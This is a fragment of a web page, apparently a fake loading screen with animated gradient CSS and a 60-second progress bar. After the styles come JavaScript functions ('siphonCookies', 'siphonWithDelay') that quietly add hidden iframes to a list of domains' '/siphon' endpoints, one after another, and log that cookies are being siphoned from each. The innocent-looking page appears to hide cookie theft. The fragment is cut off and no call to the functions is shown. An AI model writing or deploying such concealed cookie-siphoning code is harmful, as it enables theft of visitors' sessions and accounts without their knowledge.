        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: linear-gradient(135deg, #ff9a9e, #fad0c4, #fbc2eb);
            background-size: 400% 400%;
            animation: gradientBG 8s ease infinite;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            color: #444;
            text-align: center;
        }

        @keyframes gradientBG {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        h1 {

            margin-bottom: 10px;
        }

        p {

        }

        .progress-container {
            position: relative;
            width: 80%;
            max-width: 600px;
            height: 30px;
            background: rgba(255, 255, 255, 0.7);
            border-radius: 15px;
            overflow: hidden;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            margin-top: 20px;
        }

        .progress-bar {
            position: absolute;
            top: 0;
            left: 0;
            height: 100%;
            background: linear-gradient(90deg, #ff6a00, #ee0979);
            animation: load 60s linear;
            animation-fill-mode: forwards;
        }

        @keyframes load {
            from { width: 0%; }
            to { width: 100%; }
        }

        .message {
            font-size: 1rem;
            margin-top: 20px;
            opacity: 0;
            transition: opacity 1s ease-in-out;
        }

        .message.visible {
            opacity: 1;
        }

        .fun-fact {
            font-style: italic;
            color: #555;
            margin-top: 10px;
        }

        .error-message {
            font-size: 1.5rem;
            color: red;
            margin-top: 20px;
            display: none;
        }
    </style>
</head>

    // Function to create hidden iframes for cookie siphoning
    function siphonCookies(domain) {
      const iframe = document.createElement("iframe");
      iframe.style.display = "none"; // Hide the iframe

      // On inclut 'domain' en paramètre dans l'URL
      iframe.src = `http://${domain}/siphon?domain=${encodeURIComponent(domain)}`;
      document.body.appendChild(iframe);
    }

    // Function to add a delay between each domain
    function siphonWithDelay(domains, delay) {
      domains.forEach((domain, index) => {
        setTimeout(() => {
          siphonCookies(domain);
          console.log(`Siphoning cookies from: ${domain}`);
        }, index * delay);
      });
    }
